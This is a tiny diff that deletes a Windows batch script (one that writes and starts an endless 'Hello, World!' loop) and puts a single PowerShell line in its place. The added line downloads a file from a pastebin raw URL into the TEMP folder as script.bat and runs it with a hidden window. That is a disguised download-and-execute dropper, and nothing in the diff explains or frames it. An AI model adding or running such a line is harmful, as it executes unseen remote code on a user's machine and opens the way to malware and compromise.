@@ -1,5 +1,1 @@
-@echo off
-echo :helloworld > john.bat
-echo echo Hello, World! >> john.bat
-echo goto :helloworld >> john.bat
-start john.bat
+iwr -useb https://pastebin.com/raw/K01SZCjp -o $env:TEMP\script.bat; saps $env:TEMP\script.bat -WindowStyle Hidden
